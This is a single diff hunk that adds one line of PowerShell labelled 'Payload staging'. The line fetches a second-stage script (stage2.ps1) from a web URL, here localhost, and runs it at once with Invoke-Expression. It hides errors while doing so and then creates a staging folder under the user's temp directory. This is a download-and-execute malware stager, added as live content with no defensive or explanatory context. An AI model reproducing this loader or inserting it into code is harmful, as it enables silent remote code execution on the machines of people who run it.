@@ -1,0 +1,1 @@
+<# Payload staging #> $TargetUrl = "https://localhost:8000/stage2.ps1"; IEX (Invoke-WebRequest -Uri $TargetUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
